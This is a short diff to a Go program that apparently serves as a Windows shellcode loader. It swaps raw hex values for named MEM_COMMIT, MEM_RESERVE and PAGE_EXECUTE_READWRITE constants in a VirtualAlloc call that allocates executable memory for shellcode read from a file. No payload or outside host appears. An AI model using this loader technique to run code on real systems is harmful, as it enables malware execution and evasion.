@@ -7,6 +7,12 @@ import (
 	"unsafe"
 )
 
+const (
+	MEM_COMMIT             = 0x1000
+	MEM_RESERVE            = 0x2000
+	PAGE_EXECUTE_READWRITE = 0x40
+)
+
 var (
 	kernel32       = syscall.MustLoadDLL("kernel32.dll")
 	ntdll          = syscall.MustLoadDLL("ntdll.dll")
@@ -118,7 +124,7 @@ func main() {
 		shellcode = shellcodeFileData
 	}
 
-	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), 0x1000|0x2000, 0x40)
+	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
 	if addr == 0 {
 		checkErr(err)
 	}
